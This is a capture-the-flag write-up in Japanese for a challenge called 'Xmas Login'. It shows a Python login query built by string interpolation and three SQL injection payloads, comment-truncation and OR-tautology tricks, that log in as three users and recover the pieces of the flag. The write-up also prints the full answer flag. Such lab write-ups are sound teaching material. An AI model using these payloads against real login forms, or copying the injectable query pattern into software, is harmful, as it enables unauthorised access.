# Xmas Login

## 概要
ログインフォームで3人のユーザーでログインできればフラグがゲットできるようです．

## 解法
ソースコードを読むと典型的なSQLiの脆弱性が存在します．
```python
query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
    )
```
また，`alpaca`,`reindeer`,`santa_claus_admin`というユーザー名であることも分かっています．

### Part 1

まず一番有名なペイロードから試しましょう．

- username: `' OR 1=1--`
- password: `a`

次のようなSQL文が得られます．
```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password='a';
```

フラグの一部が得られます．
```
Hello, alpaca! Here is your flag: Alpaca{M3rry_Xmas!_Th1s_
```

### Part 2

次に`reindeer`でログインします．具体的には次を入力します．

- username: `reindeer'--`
- password: `a`

次のようなSQL文が得られます．
```sql
SELECT * FROM users WHERE username='reindeer' --' AND password='a';
```

フラグの続きが得られます．
```
Hello, reindeer! Here is your flag: is_4_g1ft_fr0m_santa!_an
```

### Part 3
最後にもう一度，同じ手法と行きたいところですが，どうやら`username`には文字制限があるらしく別の手法を試します．

- username: `' OR '1'='1`
- password: `' OR length(username) > 10--`


次のようなSQL文が得られます．
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR length(username) > 10 --';
```

ややこしいですが，`AND`と`OR`だと`AND`が優先されるので結局評価されるのは最後の`length(username) > 10`だけです．これを満たすユーザーは一人なので

```
Hello, santa_claus_admin! Here is your flag: d_Happy_N3w_Year_2026!!}
```



## フラグ
```
Alpaca{M3rry_Xmas!_Th1s_is_4_g1ft_fr0m_santa!_and_Happy_N3w_Year_2026!!}
```